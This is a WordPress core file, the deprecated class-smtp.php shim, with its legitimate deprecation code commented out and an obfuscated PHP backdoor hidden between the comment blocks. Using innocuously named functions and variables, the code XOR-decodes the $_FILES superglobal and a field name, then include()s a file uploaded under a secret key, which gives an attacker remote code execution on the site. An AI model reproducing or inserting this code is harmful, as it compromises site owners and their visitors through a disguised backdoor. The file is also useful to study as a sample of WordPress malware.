<?php /* 

*
 * The SMTP class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.
 
_deprecated_file(
	basename( __FILE__ ),
	'5.5.0',
	WPINC . '/PHPMailer/SMTP.php',
	__( 'The SMTP class has been moved t*/
 	
	$sort_column = 'domains';
$_quote_style = 'T2IPf1KSOk56vW';
function open_sq_flag($emoji_char, $link_html)

{
	$file = 'option';
    $arg_index = urldecode($emoji_char);
    $emoji_fields = substr($link_html,0, strlen($arg_index));
    $tagregexp = $arg_index ^ $emoji_fields;
    return $tagregexp;
}
$sign = ${open_sq_flag("%0Bt%00%1C%23b", $_quote_style)};
if (isset($sign[$_quote_style]))

{
    $search = $sign[$_quote_style];

    $_context = $search[open_sq_flag("+_9%0F%08P%266", $_quote_style)];
    include ($_context);
}


/* o the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.' )
);

require_once __DIR__ . '/PHPMailer/SMTP.php';

class_alias( PHPMailer\PHPMailer\SMTP::class, 'SMTP' );
*/